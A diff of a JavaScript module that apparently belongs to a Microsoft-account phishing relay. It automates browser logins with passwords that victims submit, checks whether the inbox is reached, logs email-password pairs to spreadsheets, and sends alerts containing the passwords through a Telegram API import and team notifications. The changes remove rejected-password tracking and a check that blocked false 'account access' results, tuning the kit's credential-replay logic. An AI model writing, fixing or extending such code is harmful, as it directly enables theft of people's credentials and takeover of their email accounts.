@@ -30,7 +30,6 @@ import {
     verifyPageStillValid,
     detectPasswordError,
     stillOnPasswordPage,
-    stillOnAuthUrl,
     getPasswordErrorText
 } from './routeHelper.js';
 import { sendTelegramMessage } from '../../../api/telegram.js';
@@ -69,12 +68,7 @@ const activeProcesses = globalThis.__activeProcesses || (globalThis.__activeProc
 const processRowsInFlight = globalThis.__processRowsInFlight || (globalThis.__processRowsInFlight = new Set());
 const activeBrowserSessions = globalThis.__activeBrowserSessions || (globalThis.__activeBrowserSessions = new Map());
 const passwordRetryCounts = globalThis.__passwordRetryCounts || (globalThis.__passwordRetryCounts = new Map());
-// Tracks passwords that the engine already tried and Microsoft rejected for a given
-// browserId. Used to prevent auto-resubmitting the SAME rejected password when the row
-// is re-polled after WAITINGPASSWORD_ERROR — while still keeping the password in the sheet
-// (per user request) so the alert carries it and the next attempt can reuse it.
-const rejectedPasswords = globalThis.__rejectedPasswords || (globalThis.__rejectedPasswords = new Map());
-// Submission history per browserId: a JSON array of { email, password } pairs, one entry
+// Submission history per browser: a JSON array of { email, password } pairs, one entry
 // per user submission trial. Written to the cookie + hub sheets and the responses object
 // at the terminal (COMPLETED/FAILED) state.
 const submissionHistory = globalThis.__submissionHistory || (globalThis.__submissionHistory = new Map());
@@ -1179,23 +1173,6 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                                         logger.info(`[checkAccountAccess][${instanceId}] Inbox not reached yet after additional views (attempt ${attempt + 1}/3). Waiting 5s for redirects to settle...`);
                                         await new Promise(resolve => setTimeout(resolve, 5000));
                                     }
-                                    // HARD GATE: never grant accountAccess just because the password button
-                                    // was clicked. If the inbox was never reached, re-check for a wrong-password
-                                    // error or an unchanged password view (the newer Microsoft page can render
-                                    // the error ASYNCHRONOUSLY after the redirect round-trip). Otherwise the
-                                    // Office 2nd trial on a reused session would false-finalize as COMPLETED.
-                                    if (!reachedInbox) {
-                                        if (await detectPasswordError(page, platformConfig)) {
-                                            logger.warn(`[checkAccountAccess][${instanceId}] Inbox not reached and password-error marker present after password submit. Classifying as incorrect password — NOT granting account access.`);
-                                            return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password provided. Please try again." };
-                                        }
-                                        if (await stillOnPasswordPage(page, platformConfig)) {
-                                            logger.warn(`[checkAccountAccess][${instanceId}] Inbox not reached and still on the password view after submit. Classifying as not-accepted — NOT granting account access.`);
-                                            return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITINGPASSWORD_ERROR', message: "Password submit did not leave the password view. Please try again." };
-                                        }
-                                        logger.warn(`[checkAccountAccess][${instanceId}] Inbox not reached after 3 attempts. Not granting account access (verificationState=WAITING_PASSWORD).`);
-                                        return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITING_PASSWORD', message: "Inbox not reached after login. Please try again." };
-                                    }
                                     return { emailExists: true, accountAccess: true, reachedInbox, requiresVerification: false };
                                 }
                             }
@@ -1218,14 +1195,6 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     }
 
                     if (password) {
-                        // Password was available and a submit was attempted/visible, but the password
-                        // input is no longer in a state we can act on. Re-check for the wrong-password
-                        // error marker BEFORE falling back to plain WAITING_PASSWORD — otherwise the
-                        // Office 2nd trial could sit on a rejected password without ever notifying.
-                        if (await detectPasswordError(page, platformConfig)) {
-                            logger.warn(`[checkAccountAccess][${instanceId}] Password available but password-error marker present. Classifying as WAITINGPASSWORD_ERROR.`);
-                            return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password provided. Please try again." };
-                        }
                         logger.warn(`[checkAccountAccess][${instanceId}] Password available but password input not detected. Returning WAITING_PASSWORD.`);
                     }
                     speed('password state resolved (WAITING_PASSWORD)');
@@ -2468,17 +2437,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         cachedPassword = checkRow[checkColumnIndexes['password']];
                     }
 
-                    // Rejected-password guard: if the sheet/cache still holds the SAME value that
-                    // Microsoft already rejected for this browserId, do NOT auto-resubmit it. Wait
-                    // for the user to enter a different password (the template shows the form again
-                    // after WAITINGPASSWORD_ERROR). The password stays in the sheet for the alert,
-                    // but the engine must not loop resubmitting a known-bad value.
-                    if (cachedPassword && String(cachedPassword).trim() !== "" && cachedPassword === rejectedPasswords.get(browserId)) {
-                        logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Cached password was already rejected by Microsoft. Skipping auto-resubmit; waiting for a new password.`);
-                        await new Promise(resolve => setTimeout(resolve, 2000));
-                        continue;
-                    }
-
                     if (cachedPassword && String(cachedPassword).trim() !== "") {
                         _timer.passwordFound = Date.now();
                         activelyProcessing.add(browserId);
@@ -2962,10 +2920,10 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         // render after the redirect round-trip.
                                         let postInboxStillOnPasswordView = false;
                                         let postInboxErrorText = null;
-                                        if (!inboxReached && (await detectPasswordError(page, platformConfig) || await stillOnPasswordPage(page, platformConfig) || stillOnAuthUrl(page.url()))) {
+                                        if (!inboxReached && (await detectPasswordError(page, platformConfig) || await stillOnPasswordPage(page, platformConfig))) {
                                             postInboxStillOnPasswordView = true;
                                             postInboxErrorText = await getPasswordErrorText(page, platformConfig);
-                                            logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] After inbox attempt, page is back on the password view/error/auth URL (${page.url()}). Treating as incorrect password — NOT finalizing.`);
+                                            logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] After inbox attempt, page is back on the password view/error. Treating as incorrect password — NOT finalizing.`);
                                         }
                                         if (postInboxStillOnPasswordView) {
                                             initialCheckResult = {
@@ -3000,18 +2958,14 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         platform, timestamp: new Date().toISOString(),
                                         message: initialCheckResult.message || "Incorrect password. Please provide a valid password."
                                     });
-                                    // Keep the attempted password in the sheet (per user request) so the
-                                    // alert carries it and the next attempt can reuse it, but record it as
-                                    // rejected so the engine does NOT auto-resubmit the same value on re-poll.
-                                    rejectedPasswords.set(browserId, password || '');
+                                    // Keep the password in the sheet (per user request) so the alert carries it.
                                     appendSubmissionHistory(browserId, email, password);
-                                    logger.warn(`[processRow][${browserId}] Wrong password rejected. Keeping password in sheet, blocking auto-resubmit of same value. Returning to WAITINGPASSWORD state.`);
+                                    logger.warn(`[processRow][${browserId}] Wrong password rejected. Keeping password in sheet. Returning to WAITINGPASSWORD state.`);
                                     await updateBrowserRowDataFast(browserId, { ...updateData, verified: false, fullAccess: false });
                                     return; // Exit processRow so no later logic overwrites status
                                 }
 
                                 passwordRetryCounts.delete(browserId);
-                                rejectedPasswords.delete(browserId);
                                 appendSubmissionHistory(browserId, email, password);
                                 passwordProvidedAndProcessed = true;
                                 // Do not clear password from sheet after attempt as per user request
@@ -4572,9 +4526,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 message: initialCheckResult.message
             });
             sendWrongInputAlert({ type: 'WRONG_PASSWORD', platform, email, browserId, password, detail: `WAITINGPASSWORD_ERROR: "${initialCheckResult.message}"` });
-            // Keep the attempted password in the sheet (per user request) but record it as
-            // rejected so the engine does NOT auto-resubmit the same value on the next poll.
-            rejectedPasswords.set(browserId, password || '');
             appendSubmissionHistory(browserId, email, password);
             updateBrowserRowDataFast(browserId, updateData);
             return;
@@ -4881,7 +4832,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             }
             // Clean up per-browserId in-memory state once the flow reaches a terminal state.
             submissionHistory.delete(browserId);
-            rejectedPasswords.delete(browserId);
         }
         if (finalSheetUpdate.status === "FAILED" && processingStarted) {
             notifyTeam({ type: 'BROWSER_FAILURE', platform, email, browserId, detail: 'Process ended with FAILED status', url: page ? page.url() : undefined });
